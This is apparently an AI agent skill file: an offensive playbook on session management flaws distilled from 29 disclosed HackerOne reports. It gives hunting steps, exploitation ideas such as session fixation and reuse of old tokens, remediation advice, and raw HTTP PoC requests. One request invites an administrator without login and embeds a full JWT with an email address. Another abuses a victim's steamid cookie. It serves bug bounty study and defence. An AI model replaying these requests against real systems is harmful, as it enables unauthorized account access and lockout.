---
name: session-management
description: "Session Management Flaws offensive playbook from 29 disclosed HackerOne reports (1 critical, 1 high, 13 medium, 14 low). Use when hunting or reviewing session management flaws. Triggers: session, after, password, attacker, cookie."
license: "For authorized security testing and education only."
---

# Session Management Flaws

> Distilled from **29** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Sessions/tokens are not invalidated, rotated, or bound correctly  -  fixation, no expiry after logout/password-change, or reuse across contexts.

## Where to hunt

- Check whether tokens survive logout, password change, and long idle periods.
- Test session fixation: does the app rotate the session ID on login?

## Exploitation playbook

- Keep an old token after a victim changes their password and confirm continued access.
- Fix a known session ID onto a victim, then ride their authenticated session.

## Bypass techniques

- Old JWTs still valid because there is no revocation list; concurrent sessions never capped.

## Impact & escalation

- Persistent access after credential rotation; stolen-token longevity.

## Remediation

- Rotate session IDs on login, invalidate on logout/password change, enforce idle+absolute expiry, maintain a revocation list for stateless tokens.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1319892](https://hackerone.com/reports/1319892)  -  Possible to invite any team member without being logged in. [ Sessi…
*medium*

```http
POST /studio/invitations?_ga=1033804257.1629921862&tenantId=583b9369-f31c-4355-bcc4-785aad9cf78f HTTP/2
Host: api.courier.com
Content-Type: application/json; charset=UTF-8
Content-Length: 57
Origin: https://www.trycourier.app
Authorization: eyJraWQiOiJPRTlwVkdlQUtCVTNxMnFlTnFPWXB6YVpobm9FK1NnaUYwdGhtMkFaSU1nPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJiN2UzNzI2Ny0zOWQwLTQwNzUtOTVlMS01NTIyYzNhOWRiM2YiLCJhdWQiOiI1ZjRmbWVjMnFudXNjcDg5cWJ0OG5zdWZ0aiIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJldmVudF9pZCI6IjQwYmU4Y2UzLTkxZDAtNGU0Yi1hOWE1LTBmZmVkOWUxMjAzYiIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNjI5OTIzOTU3LCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9wdGJSenFpTHciLCJjb2duaXRvOnVzZXJuYW1lIjoiYjdlMzcyNjctMzlkMC00MDc1LTk1ZTEtNTUyMmMzYTlkYjNmIiwiZXhwIjoxNjI5OTYwMTkzLCJpYXQiOjE2Mjk5NTY1OTMsImVtYWlsIjoiaWxvdmVidWdib3VudHlAZ21haWwuY29tIn0.gbqkE49TaxOgYwCnSkAUeausim-Phn-D1lWu_ZEuwFRGP1lBpzzNnlA3-AOCfPDjjAcueeHZJtWyMYBuDTKzFE5ZONOwo1LOyDS8TU--Ud_NAw1NO52HmeQZHGGstk4mkYd7ceAco1YpakRjaJ3SsSZlafOIk6jw6y82_ylodr1_F8iNY5--mqW5D_ioKSgcjQGpNj_ytNIQdCPsowz-LWOoNaEtwT4MjydYB1SJ1HtLNKyVatfdEWAS3FDsBaR2nOBG_Yp7hoC4leuiYTtSkPR0PlEJBqBlbRR8FJHF4-Ksa7x3D-3tQvLHq62HyVMH25QHuyQYvKbyLEFKEEr8HQ
Referer: https://www.trycourier.app/

{"email":"trycourier@yopmail.com","role":"ADMINISTRATOR"}
# … truncated …
```

### 2. [#1179232](https://hackerone.com/reports/1179232)  -  Able to blocking users with 2fa from login into their accounts by j…
*medium, $300*

```http
POST /login/confirm HTTP/1.1
Host: cs.money
Content-Length: 28
Cookie: steamid=<victim_steam_id>;

{"token":"foo","code":"foo"}
```

### 3. [#1172205](https://hackerone.com/reports/1172205)  -  Insufficient session expiration in the **com.shopify.ping** android…
*low*

```http
DELETE /api/v1/logout HTTP/1.1
authorization: Bearer atkn_**********************************
Host: accounts.shopify.com
Cookie: __cfduid=***********; _y=***************; _shopify_y=***************; request_method=POST
```

### 4. [#1172205](https://hackerone.com/reports/1172205)  -  Insufficient session expiration in the **com.shopify.ping** android…
*low*

```http
GET /oauth/userinfo HTTP/1.1
authorization: Bearer ***************
```

### 5. [#1547684](https://hackerone.com/reports/1547684)  -  Disconnecting an external login provider does not revoke session
*medium, $1,600*

```json
{{attacker prespective}}
```

### 6. [#1547684](https://hackerone.com/reports/1547684)  -  Disconnecting an external login provider does not revoke session
*medium, $1,600*

```json
{{victims prespective}}
```

More payloads: see [payloads.md](payloads.md) (9 curated).

## Recurring patterns in this dataset

Most frequent terms across the 29 reports (term (count)): `session` (41), `after` (16), `password` (15), `attacker` (12), `cookie` (10), `change` (10), `victim` (9), `token` (8), `even` (8), `logged` (7), `out` (7), `airflow` (7), `reset` (6), `authentication` (6), `fixation` (6), `login` (6), `discovered` (6), `provider` (6)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#993711](https://hackerone.com/reports/993711) | critical |  -  | cs_money | Отправка писем с произвольным текстом/кликабельными ссылками любому зарегистрированному… |
| [#1464396](https://hackerone.com/reports/1464396) | high | $2,000 | ibb | Ruby CVE-2021-41819: Cookie Prefix Spoofing in CGI::Cookie.parse |
| [#1547684](https://hackerone.com/reports/1547684) | medium | $1,600 | shopify | Disconnecting an external login provider does not revoke session |
| [#347748](https://hackerone.com/reports/347748) | medium | $560 | x | Improper session handling on web browsers |
| [#1179232](https://hackerone.com/reports/1179232) | medium | $300 | cs_money | Able to blocking users with 2fa from login into their accounts by just knowing the SteamID |
| [#1181962](https://hackerone.com/reports/1181962) | medium | $100 | nextcloud | Session fixation on public talk links |
| [#486693](https://hackerone.com/reports/486693) | medium | $50 | nextcloud | 2FA Session not expires after the password reset |
| [#272839](https://hackerone.com/reports/272839) | medium | $40 | unikrn | Weak Session ID Implementation - No Session change on Password change |

*See [reference.md](reference.md) for all 29 reports in this class.*
